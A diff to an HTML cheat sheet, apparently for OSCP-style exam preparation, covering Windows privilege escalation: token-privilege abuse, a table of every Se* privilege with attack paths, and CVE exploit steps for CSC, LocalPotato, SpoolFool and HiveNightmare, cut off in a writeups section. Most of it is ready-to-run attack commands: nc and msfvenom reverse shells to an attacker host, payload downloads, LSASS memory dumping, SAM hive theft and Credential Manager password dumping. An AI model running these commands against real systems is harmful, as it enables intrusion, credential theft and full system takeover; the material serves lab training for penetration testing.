@@ -542,6 +542,16 @@
     <div class="nav-item" onclick="showPage('fullpowers',this)"><span class="nav-dot gold"></span>FullPowers (Restore Token)</div>
     <div class="nav-item" onclick="showPage('enablepriv',this)"><span class="nav-dot gold"></span>Enable Disabled Privs</div>
 
+    <div class="sidebar-section">🔑 Rare / Situational</div>
+    <div class="nav-item" onclick="showPage('setrustedcredman',this)"><span class="nav-dot gold"></span>SeTrustedCredManAccess</div>
+
+    <div class="sidebar-section">💥 CVE Exploits</div>
+    <div class="nav-item" onclick="showPage('cves',this)"><span class="nav-dot critical"></span>CVE Quick Reference</div>
+
+    <div class="sidebar-section">📋 Reference</div>
+    <div class="nav-item" onclick="showPage('allprivs',this)"><span class="nav-dot common"></span>All Privileges Table</div>
+    <div class="nav-item" onclick="showPage('writeups',this)"><span class="nav-dot gold"></span>Writeups &amp; Research</div>
+
     <div class="sidebar-section">Resources</div>
     <div class="nav-item" onclick="showPage('links',this)"><span class="nav-dot common"></span>All Links & Tools</div>
     <div class="nav-item" onclick="showPage('enum',this)"><span class="nav-dot common"></span>Enum One-Liners</div>
@@ -1023,7 +1033,7 @@ REM Non-interactive reverse shell:
               <div class="code-block green">.\jp.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c {{WPATH}}\nc64.exe {{KALI_IP}} {{PORT}} -e cmd"
 REM -t * tries CreateProcessWithTokenW AND CreateProcessAsUser
 REM Specify COM port if 10247 is in use:
-.\jp.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c whoami" -l {{RPORT}}
+.\jp.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c whoami" -l {{PORT}}
 REM Bruteforce CLSIDs if default fails:
 .\jp.exe -t * -p "C:\Windows\System32\cmd.exe" -b</div>
             </div>
@@ -1203,7 +1213,7 @@ REM Randomize pipe name (stealth):
 
       <!-- churrasco -->
       <div class="section">
-        <div class="section-header">&#127830; churrasco.exe &mdash; Windows XP / Server 2003 (Token Kidnapping)</div>
+        <div class="section-header">&#127830; churrasco.exe &mdash; Windows XP / Server 2003 (Token Kidnapping) <a href="https://github.com/Re4son/Churrasco" target="_blank" style="font-size:11px;color:var(--teal);font-weight:400;margin-left:8px">&#8599; github.com/Re4son/Churrasco</a></div>
         <div class="section-body">
           <div class="alert alert-red">
             <span class="alert-icon">!</span>
@@ -1418,7 +1428,7 @@ $object = [Activator]::CreateInstance($type)
             <div class="step-num">2</div>
             <div class="step-content">
               <div class="step-title">Dump LSASS full memory (-ma = all regions, -64 = force 64-bit context)</div>
-              <div class="code-block">C:\Temp\procdump.exe -accepteula -64 -ma lsass.exe C:\Temp\lsass.dmp</div>
+              <div class="code-block">C:\Temp\procdump64.exe -accepteula -64 -ma lsass.exe C:\Temp\lsass.dmp</div>
             </div>
           </div>
           <div class="step">
@@ -1607,7 +1617,8 @@ mimikatz # sekurlsa::logonpasswords full</div>
             <div class="step-num">1b</div>
             <div class="step-content">
               <div class="step-title">Alternative: create pwn.dsh via cmd.exe (printf with explicit CRLF)</div>
-              <div class="code-block">cmd /c printf "set context persistent nowriters\r\nadd volume c: alias pwn\r\ncreate\r\nexpose %%pwn%% z:\r\n" > C:\Temp\pwn.dsh</div>
+              <div class="code-block"># PowerShell (preferred — guarantees CRLF that diskshadow requires):
+[System.IO.File]::WriteAllText("C:\Temp\pwn.dsh", "set context persistent nowriters`r`nadd volume c: alias pwn`r`ncreate`r`nexpose %pwn% z:`r`n")</div>
             </div>
           </div>
           <div class="step">
@@ -2066,8 +2077,10 @@ reg save HKLM\SYSTEM C:\Temp\system
             <div class="step-content">
               <div class="step-title">Download tools to target</div>
               <div class="code-block purple">iwr http://{{KALI_IP}}:{{PORT}}/windows/eoploaddriver_x64.exe -o C:\Temp\eoploaddriver_x64.exe
-# szkg64.sys: obtain from Exploit-DB entry 45401 and place in ~/privesc-toolkit/windows/
-iwr http://{{KALI_IP}}:{{PORT}}/windows/szkg64.sys -o C:\Temp\szkg64.sys</div>
+# szkg64.sys: Exploit-DB entry 45401 — place in ~/privesc-toolkit/windows/ before serving
+iwr http://{{KALI_IP}}:{{PORT}}/windows/szkg64.sys -o C:\Temp\szkg64.sys
+# szkg64exploit.exe: compiled exploit binary for CVE-2018-15732 — github.com/padovah4ck/CVE-2018-15732
+iwr http://{{KALI_IP}}:{{PORT}}/windows/szkg64exploit.exe -o C:\Temp\szkg64exploit.exe</div>
             </div>
           </div>
           <div class="step">
@@ -2700,8 +2713,8 @@ whoami /priv</div>
             <div class="step-num">3</div>
             <div class="step-content">
               <div class="step-title">Alternative: use winrs (simpler, same effect)</div>
-              <div class="code-block">winrs -r:{{WPATH}} -u:username -p:password "whoami /priv"
-winrs -r:{{WPATH}} -u:username -p:password cmd</div>
+              <div class="code-block">winrs -r:{{TARGET}} -u:{{USER}} -p:{{PASS}} "whoami /priv"
+winrs -r:{{TARGET}} -u:{{USER}} -p:{{PASS}} cmd</div>
             </div>
           </div>
           <div class="step">
@@ -2713,7 +2726,7 @@ echo "set context persistent nowriters" > C:\Temp\pwn.dsh
 echo "add volume c: alias pwn" >> C:\Temp\pwn.dsh
 echo "create" >> C:\Temp\pwn.dsh
 echo "expose %pwn% z:" >> C:\Temp\pwn.dsh
-unix2dos C:\Temp\pwn.dsh   # or use notepad to ensure proper line endings
+(Get-Content C:\Temp\pwn.dsh) | Set-Content -Encoding ASCII C:\Temp\pwn.dsh  # fix CRLF line endings
 
 diskshadow.exe /s C:\Temp\pwn.dsh</div>
             </div>
@@ -3123,6 +3136,308 @@ $type[0]::EnablePrivilege($processHandle, "SeBackupPrivilege")</div>
           <div class="alert alert-teal">
             <span class="alert-icon">🔗</span>
             <span>PrivFu: <a href="https://github.com/daem0nc0re/PrivFu" target="_blank">github.com/daem0nc0re/PrivFu</a> | Priv2Admin: <a href="https://github.com/gtworek/Priv2Admin" target="_blank">github.com/gtworek/Priv2Admin</a></span>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- SeTrustedCredManAccess -->
+    <div id="page-setrustedcredman" class="page">
+      <div class="page-header">
+        <div class="page-title">🔑 SeTrustedCredManAccessPrivilege <span class="severity-badge sev-rare">THREAT</span></div>
+        <div class="page-sub">// CREDENTIAL MANAGER DUMP → PLAINTEXT CREDS → LATERAL MOVEMENT</div>
+      </div>
+      <div class="info-grid">
+        <div class="info-card"><div class="info-label">Who Has It</div><div class="info-value">Very rarely delegated. Some backup agents, RAS/VPN services</div></div>
+        <div class="info-card"><div class="info-label">Impact</div><div class="info-value">Read all credentials stored in Windows Credential Manager (plaintext)</div></div>
+        <div class="info-card"><div class="info-label">Severity</div><div class="info-value">THREAT — lateral movement, not always direct SYSTEM</div></div>
+        <div class="info-card"><div class="info-label">Reference</div><div class="info-value">@tiraniddo blog — Credential Manager access via privileged binding</div></div>
+      </div>
+      <div class="alert alert-gold">
+        <span class="alert-icon">💡</span>
+        <span>SeTrustedCredManAccessPrivilege allows direct read of the Credential Manager vault via <strong>CredReadDomainCredentials</strong> at a higher privilege level than normal. The Microsoft Docs describe it as "required for trusted access to Credential Manager" — in practice it means you can read credentials stored by other users on the machine if they used Windows Credential Manager.</span>
+      </div>
+      <div class="section">
+        <div class="section-header">⚡ Detection</div>
+        <div class="section-body">
+          <div class="step"><div class="step-num">1</div><div class="step-content">
+            <div class="step-title">Confirm privilege is present</div>
+            <div class="code-block">whoami /priv | findstr SeTrustedCredMan</div>
+          </div></div>
+          <div class="step"><div class="step-num">2</div><div class="step-content">
+            <div class="step-title">Enable if Disabled</div>
+            <div class="code-block purple">iwr http://{{KALI_IP}}:{{PORT}}/windows/EnableAllTokenPrivs.ps1 -o C:\Temp\ep.ps1; powershell -ep bypass -File C:\Temp\ep.ps1</div>
+          </div></div>
+        </div>
+      </div>
+      <div class="section">
+        <div class="section-header">⚡ Exploitation — CredentialManager dump via PrivFu</div>
+        <div class="section-body">
+          <div class="step"><div class="step-num">1</div><div class="step-content">
+            <div class="step-title">Download PrivFu toolkit</div>
+            <div class="code-block purple">iwr http://{{KALI_IP}}:{{PORT}}/windows/CredentialManager.exe -o C:\Temp\CredentialManager.exe</div>
+          </div></div>
+          <div class="step"><div class="step-num">2</div><div class="step-content">
+            <div class="step-title">Dump all stored credentials</div>
+            <div class="code-block green">C:\Temp\CredentialManager.exe</div>
+          </div></div>
+          <div class="step"><div class="step-num">3</div><div class="step-content">
+            <div class="step-title">Alternative — built-in cmdkey to list, then use targeted dump</div>
+            <div class="code-block">cmdkey /list
+# Then: use vaultcmd to query specific vault entries
+vaultcmd /listcreds:"Windows Credentials" /all</div>
+          </div></div>
+          <div class="step"><div class="step-num">4</div><div class="step-content">
+            <div class="step-title">PowerShell — enumerate all credential vaults</div>
+            <div class="code-block purple">[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
+$vault = New-Object Windows.Security.Credentials.PasswordVault
+$vault.RetrieveAll() | ForEach-Object { $_.RetrievePassword(); $_ }</div>
+          </div></div>
+        </div>
+      </div>
+      <div class="alert alert-teal">
+        <span class="alert-icon">🔗</span>
+        <span>PrivFu: <a href="https://github.com/daem0nc0re/PrivFu" target="_blank">github.com/daem0nc0re/PrivFu</a> | Blog: <a href="https://www.tiraniddo.dev/2020/04/sharing-logon-session-sids.html" target="_blank">tiraniddo.dev</a> | Priv2Admin: <a href="https://github.com/gtworek/Priv2Admin" target="_blank">gtworek/Priv2Admin</a></span>
+      </div>
+    </div>
+
+    <!-- ALL PRIVILEGE REFERENCE TABLE -->
+    <div id="page-allprivs" class="page">
+      <div class="page-header">
+        <div class="page-title">📋 All Windows Privileges Reference <span class="severity-badge sev-common">COMPLETE TABLE</span></div>
+        <div class="page-sub">// EVERY Se* PRIVILEGE — THREAT LEVEL, ATTACK PATH, TOOLS (Priv2Admin mapping)</div>
+      </div>
+      <div class="alert alert-gold">
+        <span class="alert-icon">💡</span>
+        <span><strong>Rule:</strong> Every privilege in <code>whoami /priv</code> — even Disabled — is worth checking. Disabled ≠ not exploitable. Source: <a href="https://github.com/gtworek/Priv2Admin" target="_blank" style="color:var(--teal)">gtworek/Priv2Admin</a> + <a href="https://hacerdalkiran.medium.com/critical-windows-user-privileges-for-windows-privesc-55ef12824f90" target="_blank" style="color:var(--teal)">Hacer Dalkiran writeup</a></span>
+      </div>
+      <table style="width:100%;border-collapse:collapse;font-size:12px;margin-top:12px">
+        <thead>
+          <tr style="background:var(--bg3);border-bottom:2px solid var(--border)">
+            <th style="padding:8px 10px;text-align:left;color:var(--accent2)">Privilege</th>
+            <th style="padding:8px 10px;text-align:left;color:var(--accent2)">Threat</th>
+            <th style="padding:8px 10px;text-align:left;color:var(--accent2)">Method</th>
+            <th style="padding:8px 10px;text-align:left;color:var(--accent2)">Key Tool / Command</th>
+            <th style="padding:8px 10px;text-align:left;color:var(--accent2)">Notes</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr style="border-bottom:1px solid var(--border)"><td style="padding:6px 10px"><span style="color:#ff6b6b">SeImpersonatePrivilege</span></td><td><span style="color:#ff6b6b">CRITICAL</span></td><td>Token impersonation</td><td>GodPotato, PrintSpoofer, SigmaPotato</td><td>IIS/MSSQL service accounts</td></tr>
+          <tr style="border-bottom:1px solid var(--border)"><td style="padding:6px 10px"><span style="color:#ff6b6b">SeAssignPrimaryTokenPrivilege</span></td><td><span style="color:#ff6b6b">CRITICAL</span></td><td>Token swap</td><td>GodPotato, JuicyPotatoNG -t u</td><td>Same context as SeImpersonate</td></tr>
+          <tr style="border-bottom:1px solid var(--border)"><td style="padding:6px 10px"><span style="color:#ff6b6b">SeDebugPrivilege</span></td><td><span style="color:#ff6b6b">CRITICAL</span></td><td>Process injection</td><td>mimikatz, procdump64, comsvcs.dll</td><td>LSASS dump → all creds</td></tr>
+          <tr style="border-bottom:1px solid var(--border)"><td style="padding:6px 10px"><span style="color:#ff6b6b">SeManageVolumePrivilege</span></td><td><span style="color:#ff6b6b">CRITICAL</span></td><td>C:\ DACL → DLL hijack</td><td>SeManageVolumeExploit.exe</td><td>Works even DISABLED (self-enables)</td></tr>
+          <tr style="border-bottom:1px solid var(--border)"><td style="padding:6px 10px"><span style="color:#9b59b6">SeBackupPrivilege</span></td><td><span style="color:#9b59b6">HIGH</span></td><td>File ACL bypass</td><td>robocopy /b, reg save, secretsdump</td><td>robocopy works even DISABLED</td></tr>
+          <tr style="border-bottom:1px solid var(--border)"><td style="padding:6px 10px"><span style="color:#9b59b6">SeRestorePrivilege</span></td><td><span style="color:#9b59b6">HIGH</span></td><td>Write any file</td><td>SeRestoreAbuse.exe</td><td>Enable first</td></tr>
+          <tr style="border-bottom:1px solid var(--border)"><td style="padding:6px 10px"><span style="color:#9b59b6">SeTakeOwnershipPrivilege</span></td><td><span style="color:#9b59b6">HIGH</span></td><td>Own any file</td><td>takeown, icacls, PowerShell SetOwner</td><td>Enable first; backup utilman</td></tr>
+          <tr style="border-bottom:1px solid var(--border)"><td style="padding:6px 10px"><span style="color:#9b59b6">SeLoadDriverPrivilege</span></td><td><span style="color:#9b59b6">HIGH</span></td><td>Load vuln kernel driver</td><td>eoploaddriver + ExploitCapcom/szkg64</td><td>Enable first; Capcom may be blocked</td></tr>
+          <tr style="border-bottom:1px solid var(--border)"><td style="padding:6px 10px"><span style="color:#9b59b6">SeTcbPrivilege</span></td><td><span style="color:#9b59b6">HIGH</span></td><td>LsaLogonUser S4U</td><td>TcbElevation.exe, PrivFu</td><td>ExploitDB paper #42556</td></tr>
+          <tr style="border-bottom:1px solid var(--border)"><td style="padding:6px 10px"><span style="color:#9b59b6">SeCreateTokenPrivilege</span></td><td><span style="color:#9b59b6">HIGH</span></td><td>Forge token</td><td>token-priv, PrivFu</td><td>Needs SeImpersonate companion</td></tr>
+          <tr style="border-bottom:1px solid var(--border)"><td style="padding:6px 10px"><span style="color:#9b59b6">SeRelabelPrivilege</span></td><td><span style="color:#9b59b6">MEDIUM</span></td><td>Change integrity label</td><td>PrivFu SetIntegrityLevel.exe</td><td>Only useful if already High IL</td></tr>
+          <tr style="border-bottom:1px solid var(--border)"><td style="padding:6px 10px"><span style="color:#9b59b6">SeCreateSymbolicLinkPrivilege</span></td><td><span style="color:#9b59b6">MEDIUM</span></td><td>Symlink redirect</td><td>mklink, New-Item SymbolicLink</td><td>Service write redirect to attacker path</td></tr>
+          <tr style="border-bottom:1px solid var(--border)"><td style="padding:6px 10px"><span style="color:#9b59b6">SeSecurityPrivilege</span></td><td><span style="color:#9b59b6">MEDIUM</span></td><td>Event log mgmt</td><td>wevtutil</td><td>Log clearing / reading sensitive events</td></tr>
+          <tr style="border-bottom:1px solid var(--border)"><td style="padding:6px 10px"><span style="color:#f39c12">SeTrustedCredManAccessPrivilege</span></td><td><span style="color:#f39c12">THREAT</span></td><td>Credential Manager</td><td>PrivFu CredentialManager.exe</td><td>Read all vault creds</td></tr>
+          <tr style="border-bottom:1px solid var(--border)"><td style="padding:6px 10px"><span style="color:#f39c12">SeAuditPrivilege</span></td><td><span style="color:#f39c12">THREAT</span></td><td>Write security events</td><td>Authz API (3rd party)</td><td>Forge/flood security log; overwrite old events</td></tr>
+          <tr style="border-bottom:1px solid var(--border)"><td style="padding:6px 10px"><span style="color:#3498db">SeSystemEnvironmentPrivilege</span></td><td><span style="color:#3498db">HIGH</span></td><td>EFI var modify</td><td>RWEverything</td><td>Persistence — survives OS reinstall</td></tr>
+          <tr style="border-bottom:1px solid var(--border)"><td style="padding:6px 10px"><span style="color:#3498db">SeShutdownPrivilege</span></td><td><span style="color:#3498db">SITUATIONAL</span></td><td>Force reboot</td><td>shutdown /r /t 0</td><td>Triggers payloads on restart</td></tr>
+          <tr style="border-bottom:1px solid var(--border)"><td style="padding:6px 10px"><span style="color:#3498db">SeRemoteShutdownPrivilege</span></td><td><span style="color:#3498db">AVAILABILITY</span></td><td>Remote reboot</td><td>shutdown /s /f /m \\server1</td><td>DoS / reboot remote host</td></tr>
+          <tr style="border-bottom:1px solid var(--border)"><td style="padding:6px 10px"><span style="color:#3498db">SeIncreaseBasePriorityPrivilege</span></td><td><span style="color:#3498db">AVAILABILITY</span></td><td>Process priority</td><td>start /realtime AppName.exe</td><td>Can starve other processes on servers</td></tr>
+          <tr style="border-bottom:1px solid var(--border)"><td style="padding:6px 10px"><span style="color:#3498db">SeIncreaseQuotaPrivilege</span></td><td><span style="color:#3498db">AVAILABILITY</span></td><td>Resource quotas</td><td>3rd party tool</td><td>Change CPU/memory limits → unbootable</td></tr>
+          <tr style="border-bottom:1px solid var(--border)"><td style="padding:6px 10px"><span style="color:#3498db">SeLockMemoryPrivilege</span></td><td><span style="color:#3498db">AVAILABILITY</span></td><td>Memory starvation</td><td>PoC by @waleedassar</td><td>Lock pages → OS memory starvation</td></tr>
+          <tr style="border-bottom:1px solid var(--border)"><td style="padding:6px 10px"><span style="color:#3498db">SeTimeZonePrivilege</span></td><td><span style="color:#3498db">MESS</span></td><td>Timezone change</td><td>tzutil /s "Chatham Islands Standard Time"</td><td>Breaks time-based auth / logging</td></tr>
+          <tr style="border-bottom:1px solid var(--border)"><td style="padding:6px 10px;color:var(--muted)">SeChangeNotifyPrivilege</td><td style="color:var(--muted)">NONE</td><td>Bypass traverse</td><td>—</td><td>Default for all users — not interesting</td></tr>
+          <tr style="border-bottom:1px solid var(--border)"><td style="padding:6px 10px;color:var(--muted)">SeIncreaseWorkingSetPrivilege</td><td style="color:var(--muted)">NONE</td><td>Working set</td><td>—</td><td>Default for all users — not interesting</td></tr>
+          <tr style="border-bottom:1px solid var(--border)"><td style="padding:6px 10px;color:var(--muted)">SeMachineAccountPrivilege</td><td style="color:var(--muted)">NONE</td><td>Add workstation</td><td>—</td><td>AD: add machine account — useful in AD attacks</td></tr>
+          <tr style="border-bottom:1px solid var(--border)"><td style="padding:6px 10px;color:var(--muted)">SeEnableDelegationPrivilege</td><td style="color:var(--muted)">NONE (Windows)</td><td>Delegation</td><td>—</td><td>Unused in modern Windows</td></tr>
+          <tr style="border-bottom:1px solid var(--border)"><td style="padding:6px 10px;color:var(--muted)">SeProfileSingleProcessPrivilege</td><td style="color:var(--muted)">NONE</td><td>Profiling</td><td>—</td><td>Prefetch/SuperFetch parameters only</td></tr>
+          <tr style="border-bottom:1px solid var(--border)"><td style="padding:6px 10px;color:var(--muted)">SeCreateGlobalPrivilege</td><td style="color:var(--muted)">NONE</td><td>Global objects</td><td>—</td><td>Needed by some services</td></tr>
+          <tr style="border-bottom:1px solid var(--border)"><td style="padding:6px 10px;color:var(--muted)">SeUndockPrivilege</td><td style="color:var(--muted)">NONE</td><td>Undock laptop</td><td>—</td><td>Legacy — irrelevant on servers</td></tr>
+          <tr style="border-bottom:1px solid var(--border)"><td style="padding:6px 10px;color:var(--muted)">SeSyncAgentPrivilege</td><td style="color:var(--muted)">NONE (Windows)</td><td>Sync agent</td><td>—</td><td>Unused in modern Windows</td></tr>
+          <tr style="border-bottom:1px solid var(--border)"><td style="padding:6px 10px;color:var(--muted)">SeDelegateSessionUserImpersonatePrivilege</td><td style="color:var(--muted)">UNKNOWN</td><td>Session impersonation</td><td>—</td><td>Rare — research manually</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <!-- CVE / KERNEL EXPLOITS PAGE -->
+    <div id="page-cves" class="page">
+      <div class="page-header">
+        <div class="page-title">💥 CVE Exploits — No Privileges Needed <span class="severity-badge sev-critical">CRITICAL</span></div>
+        <div class="page-sub">// THESE WORK WITHOUT ANY SPECIAL TOKEN — CHECK PATCH LEVEL FIRST</div>
+      </div>
+      <div class="alert alert-red">
+        <span class="alert-icon">⚠</span>
+        <span><strong>Always check:</strong> <code>systeminfo | findstr "OS\|Hotfix"</code> and <code>wmic qfe get HotFixID</code> before attempting any CVE. If the machine is unpatched, these hit fast.</span>
+      </div>
+
+      <div class="section">
+        <div class="section-header">💥 CVE-2024-26229 — Windows CSC Service LPE (Seen in OSCP notes 2024)</div>
+        <div class="section-body">
+          <div class="alert alert-gold"><span class="alert-icon">💡</span><span>CSC (Client-Side Caching) service improper privilege handling → arbitrary SYSTEM write. No token privileges required. PoC is a standalone EXE.</span></div>
+          <div class="step"><div class="step-num">1</div><div class="step-content">
+            <div class="step-title">Check patch status</div>
+            <div class="code-block">wmic qfe get HotFixID | findstr "KB5036893\|KB5036892\|KB5036891"
+# If not listed → potentially vulnerable</div>
+          </div></div>
+          <div class="step"><div class="step-num">2</div><div class="step-content">
+            <div class="step-title">Transfer and run PoC</div>
+            <div class="code-block purple">iwr http://{{KALI_IP}}:{{PORT}}/windows/CVE-2024-26229.exe -o C:\Temp\cve26229.exe
+C:\Temp\cve26229.exe</div>
+          </div></div>
+          <div class="alert alert-teal"><span class="alert-icon">🔗</span><span>PoC: <a href="https://github.com/michredteam/PoC-26229" target="_blank">github.com/michredteam/PoC-26229</a> | OSCP notes ref: <a href="https://oscp.adot8.com/windows-privilege-escalation/whoami-priv" target="_blank">oscp.adot8.com</a></span></div>
+        </div>
+      </div>
+
+      <div class="section">
+        <div class="section-header">💥 LocalPotato CVE-2023-21746 → StorSvc DLL Hijack</div>
+        <div class="section-body">
+          <div class="alert alert-gold"><span class="alert-icon">💡</span><span>NTLM local authentication confusion → write SprintCSP.dll to a PATH directory → trigger StorSvc SvcRebootToFlashingMode → SYSTEM. <strong>No SeImpersonate needed</strong> — pure CVE + DLL hijack.</span></div>
+          <div class="step"><div class="step-num">1</div><div class="step-content">
+            <div class="step-title">Generate malicious SprintCSP.dll</div>
+            <div class="code-block purple">msfvenom -p windows/x64/shell_reverse_tcp LHOST={{KALI_IP}} LPORT={{RPORT}} -f dll -o SprintCSP.dll</div>
+          </div></div>
+          <div class="step"><div class="step-num">2</div><div class="step-content">
+            <div class="step-title">Transfer LocalPotato and the DLL</div>
+            <div class="code-block purple">iwr http://{{KALI_IP}}:{{PORT}}/windows/LocalPotato.exe -o C:\Temp\LocalPotato.exe
+iwr http://{{KALI_IP}}:{{PORT}}/SprintCSP.dll -o C:\Temp\SprintCSP.dll</div>
+          </div></div>
+          <div class="step"><div class="step-num">3</div><div class="step-content">
+            <div class="step-title">Start listener and trigger</div>
+            <div class="code-block green">C:\Temp\LocalPotato.exe -exe C:\Windows\System32\StorSvc.dll -dll C:\Temp\SprintCSP.dll</div>
+          </div></div>
+          <div class="alert alert-teal"><span class="alert-icon">🔗</span><span>PoC: <a href="https://github.com/Muhammad-Ali007/LocalPotato_CVE-2023-21746" target="_blank">Muhammad-Ali007/LocalPotato</a> | Research: <a href="https://github.com/blackarrowsec/redteam-research/tree/master/LPE%20via%20StorSvc" target="_blank">blackarrowsec/StorSvc research</a></span></div>
+        </div>
+      </div>
+
+      <div class="section">
+        <div class="section-header">💥 SpoolFool CVE-2022-21999 — Spooler Directory ACL Abuse</div>
+        <div class="section-body">
+          <div class="alert alert-gold"><span class="alert-icon">💡</span><span>Windows Print Spooler service directory ACL misconfiguration → write malicious DLL → loaded by Spooler as SYSTEM. Affects Win 10/11, Server 2019/2022 unpatched. No token privileges required.</span></div>
+          <div class="step"><div class="step-num">1</div><div class="step-content">
+            <div class="step-title">Check if spooler is running and patch level</div>
+            <div class="code-block">sc query Spooler
+wmic qfe get HotFixID | findstr "KB5010386\|KB5010395"</div>
+          </div></div>
+          <div class="step"><div class="step-num">2</div><div class="step-content">
+            <div class="step-title">Transfer and run SpoolFool</div>
+            <div class="code-block purple">iwr http://{{KALI_IP}}:{{PORT}}/windows/SpoolFool.exe -o C:\Temp\SpoolFool.exe
+C:\Temp\SpoolFool.exe -dll C:\Temp\shell.dll</div>
+          </div></div>
+          <div class="step"><div class="step-num">3</div><div class="step-content">
+            <div class="step-title">Generate shell.dll (Kali)</div>
+            <div class="code-block purple">msfvenom -p windows/x64/shell_reverse_tcp LHOST={{KALI_IP}} LPORT={{RPORT}} -f dll -o shell.dll</div>
+          </div></div>
+          <div class="alert alert-teal"><span class="alert-icon">🔗</span><span>PoC: <a href="https://github.com/ly4k/SpoolFool" target="_blank">github.com/ly4k/SpoolFool</a></span></div>
+        </div>
+      </div>
+
+      <div class="section">
+        <div class="section-header">💥 HiveNightmare CVE-2021-36934 (SeriousSam) — SAM Readable by Any User</div>
+        <div class="section-body">
+          <div class="alert alert-red"><span class="alert-icon">⚠</span><span>VSS shadow copies of SAM/SECURITY/SYSTEM are readable by <strong>ANY authenticated user</strong> on unpatched Windows 10 21H1 and earlier. Check with icacls first.</span></div>
+          <div class="step"><div class="step-num">1</div><div class="step-content">
+            <div class="step-title">Check if vulnerable</div>
+            <div class="code-block">icacls C:\Windows\System32\config\SAM
+# Vulnerable if output shows: BUILTIN\Users:(RX) or BU:(RX)</div>
+          </div></div>
+          <div class="step"><div class="step-num">2</div><div class="step-content">
+            <div class="step-title">Copy hives from shadow copy (no privileges needed)</div>
+            <div class="code-block green">for /f "tokens=*" %i in ('vssadmin list shadows ^| findstr "Shadow Copy Volume"') do @echo %i
+# Use the shadow copy path, e.g. \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\Temp\SAM
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Temp\SYSTEM
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY C:\Temp\SECURITY</div>
+          </div></div>
+          <div class="step"><div class="step-num">3</div><div class="step-content">
+            <div class="step-title">Kali: dump hashes offline</div>
+            <div class="code-block purple">impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL</div>
+          </div></div>
+          <div class="step"><div class="step-num">4</div><div class="step-content">
+            <div class="step-title">Alternative: use HiveNightmare exploit binary</div>
+            <div class="code-block purple">iwr http://{{KALI_IP}}:{{PORT}}/windows/HiveNightmare.exe -o C:\Temp\HiveNightmare.exe
+C:\Temp\HiveNightmare.exe</div>
+          </div></div>
+          <div class="alert alert-teal"><span class="alert-icon">🔗</span><span>PoC: <a href="https://github.com/GossiTheDog/HiveNightmare" target="_blank">GossiTheDog/HiveNightmare</a> | <a href="https://www.fortify24x7.com/2024/09/cve-2021-36934-hivenightmare/" target="_blank">Writeup</a></span></div>
+        </div>
+      </div>
+    </div>
+
+    <!-- WRITEUP REFERENCES -->
+    <div id="page-writeups" class="page">
+      <div class="page-header">
+        <div class="page-title">📖 Real-World Writeups &amp; References <span class="severity-badge sev-common">RESEARCH</span></div>
+        <div class="page-sub">// MACHINES WHERE THESE TECHNIQUES WERE USED — READ THESE BEFORE YOUR EXAM</div>
+      </div>
+      <div class="alert alert-gold">
+        <span class="alert-icon">💡</span>
+        <span>These are the actual writeups that document how token privileges were exploited on real OSCP/PG/HTB boxes. Read the Access writeups in full — SeManageVolumePrivilege disabled ≠ not exploitable is the key lesson. See also: <a href="https://github.com/gtworek/Priv2Admin" target="_blank" style="color:var(--teal)">Priv2Admin</a> reference table.</span>
+      </div>
+
+      <div class="section">
+        <div class="section-header">🎯 [ACCESS] PG Practice — SeManageVolumePrivilege → SYSTEM (5 writeups)</div>
+        <div class="section-body">
+          <div style="display:grid;gap:8px">
+            <div style="background:var(--bg3);border-radius:4px;padding:10px 14px">
+              <div style="color:var(--gold);font-weight:700;margin-bottom:4px">[1] Dpsypher — Original clean writeup (tzres.dll trigger)</div>
+              <div style="font-size:12px;color:var(--text2);margin-bottom:6px">Chain: Kerberoast svc_mssql → RunasCs → SeManageVolumeExploit → icacls C:\ → tzres.dll hijack → SYSTEM</div>
+              <a href="https://medium.com/@Dpsypher/proving-grounds-practice-access-b95d3146cfe9" target="_blank" style="color:var(--teal);font-size:12px">medium.com/@Dpsypher/proving-grounds-practice-access &#8599;</a>
+            </div>
+            <div style="background:var(--bg3);border-radius:4px;padding:10px 14px">
+              <div style="color:var(--gold);font-weight:700;margin-bottom:4px">[2] Motasem Hamdan — AD breakdown + PrintConfig DLL path</div>
+              <div style="font-size:12px;color:var(--text2);margin-bottom:6px">Extra: Uses Sliver C2, explains FSCTL_SD_GLOBAL_CHANGE mechanism in detail</div>
+              <a href="https://motasemhamdan.medium.com/active-directory-pentesting-offensive-security-proving-grounds-access-writeup-ddf4f3c6fcb9" target="_blank" style="color:var(--teal);font-size:12px">motasemhamdan.medium.com/...access-writeup &#8599;</a>
+            </div>
+            <div style="background:var(--bg3);border-radius:4px;padding:10px 14px">
+              <div style="color:var(--gold);font-weight:700;margin-bottom:4px">[3] Muhammad Ichwan — Most detailed Printconfig.cpp source</div>
+              <div style="font-size:12px;color:var(--text2);margin-bottom:6px">Includes actual Printconfig.cpp source code — compile your own DLL without msfvenom</div>
+              <a href="https://banua.medium.com/proving-grounds-access-oscp-prep-2025-practice-7-557f902bf1a9" target="_blank" style="color:var(--teal);font-size:12px">banua.medium.com/...access-oscp-prep-2025 &#8599;</a>
+            </div>
+            <div style="background:var(--bg3);border-radius:4px;padding:10px 14px">
+              <div style="color:var(--gold);font-weight:700;margin-bottom:4px">[4] siberfaqih — Visual beginner-friendly walkthrough</div>
+              <div style="font-size:12px;color:var(--text2);margin-bottom:6px">Clean screenshots, good for understanding the icacls step and DLL placement</div>
+              <a href="https://medium.com/@siberfaqih/offsec-proving-grounds-access-a-complete-writeup-walkthrough-12ad7f6bad6f" target="_blank" style="color:var(--teal);font-size:12px">medium.com/@siberfaqih/...access-complete-walkthrough &#8599;</a>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div class="section">
+        <div class="section-header">🎯 [HOKKAIDO] PG Practice — SeBackupPrivilege → NTDS.dit</div>
+        <div class="section-body">
+          <div style="background:var(--bg3);border-radius:4px;padding:10px 14px">
